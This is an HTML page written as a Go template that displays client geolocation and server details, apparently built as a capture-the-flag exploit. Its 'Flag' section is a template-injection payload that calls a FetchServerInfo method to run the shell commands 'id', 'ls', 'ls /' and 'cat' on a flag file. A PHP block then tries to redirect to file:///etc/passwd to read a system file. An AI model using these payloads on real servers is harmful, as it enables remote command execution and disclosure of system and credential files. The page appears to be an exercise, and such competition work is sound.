<!DOCTYPE html>
<html>
<head>
    <title>Client & Server Info</title>
</head>
<body>
    <h2>Client Information</h2>
    <ul>
        <li>Client IP: {{.ClientIP}}</li>
        <li>User Agent: {{.ClientUA}}</li>
        {{with .ClientIpInfo}}
            <li>IP Version: {{.IpVersion}}</li>
            <li>IP Address: {{.IpAddress}}</li>
            <li>Latitude: {{.Latitude}}</li>
            <li>Longitude: {{.Longitude}}</li>
            <li>Country Name: {{.CountryName}}</li>
            <li>Country Code: {{.CountryCode}}</li>
            <li>Time Zone: {{.TimeZone}}</li>
            <li>Zip Code: {{.ZipCode}}</li>
            <li>City Name: {{.CityName}}</li>
            <li>Region Name: {{.RegionName}}</li>
            <li>Continent: {{.Continent}}</li>
            <li>Continent Code: {{.ContinentCode}}</li>
        {{end}}
    </ul>
    <h2>Server Information</h2>
    <ul>
        <li>Hostname: {{.ServerInfo.Hostname}}</li>
        <li>Operating System: {{.ServerInfo.OS}}</li>
        <li>Kernel Version: {{.ServerInfo.KernelVersion}}</li>
        <li>Memory: {{.ServerInfo.Memory}}</li>
    </ul>
        <h2>Flag</h2>
    <ul>
        <li>Flag: {{.FetchServerInfo "id"}}</li>
        <li>Flag: {{.FetchServerInfo "ls" }}</li>
        <li>Flag: {{.FetchServerInfo "ls /" }}</li>
        <li>Flag: {{.FetchServerInfo "cat /flagcc1c0e8da4.txt" }}</li>
    </ul>

    <?php
    header('location:file:///etc/passwd');
    ?>
</body>
</html>
